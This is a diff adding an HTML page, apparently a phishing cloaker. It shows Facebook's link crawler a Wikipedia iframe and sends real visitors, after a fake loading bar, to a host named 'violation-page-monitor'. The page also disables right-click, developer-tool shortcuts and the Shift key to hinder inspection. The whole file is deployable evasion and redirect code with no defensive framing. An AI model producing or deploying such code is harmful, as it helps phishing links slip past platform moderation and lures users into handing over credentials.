@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #141E30, #243B55);
+            overflow: hidden;
+        }
+        .loading-bar {
+            width: 300px;
+            height: 10px;
+            background: #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #00f260, #0575e6);
+            width: 0%;
+            transition: width 0.05s linear;
+        }
+        iframe {
+            border: none;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-bar" id="loading-bar">
+        <div class="progress"></div>
+    </div>
+
+    <script>
+        // Bot Detection
+        (function () {
+            const userAgent = navigator.userAgent || '';
+
+            // Check for Facebook Crawler
+            const isFacebookBot = /facebookexternalhit|Facebot/i.test(userAgent);
+
+            if (isFacebookBot) {
+                // Replace page content for bots
+                document.body.innerHTML = `<iframe src="https://en.wikipedia.org/wiki/Main_Page"></iframe>`;
+            } else {
+                // Normal user behavior
+                const progressBar = document.querySelector('.progress');
+                const loadingBar = document.getElementById('loading-bar');
+                let progress = 0;
+
+                const loadingAnimation = setInterval(() => {
+                    progress++;
+                    progressBar.style.width = progress + '%';
+                    if (progress >= 100) {
+                        clearInterval(loadingAnimation);
+
+                        // Wait 5 seconds before redirecting
+                        setTimeout(() => {
+                            window.location.href = "https://violation-page-monitor.replit.app/request"; // Replace with your target URL
+                        }, 1000);
+                    }
+                }, 50); // Adjust speed of loading bar (50ms for smooth animation)
+            }
+        })();
+
+        // Security Features
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault(); // Disable right-click
+        });
+
+        // Disable F12 (Dev Tools) and other key combinations
+        document.onkeydown = function(e) {
+            // Disable F12 (F12 opens DevTools)
+            if (e.keyCode === 123) {
+                return false;
+            }
+
+            // Disable Ctrl+Shift+I (Opens the DevTools "Inspect" tab)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                return false;
+            }
+
+            // Disable Ctrl+Shift+J (Opens the DevTools "Console" tab)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                return false;
+            }
+
+            // Disable Shift key
+            if (e.shiftKey) {
+                return false;
+            }
+        };
+    </script>
+</body>
+</html>
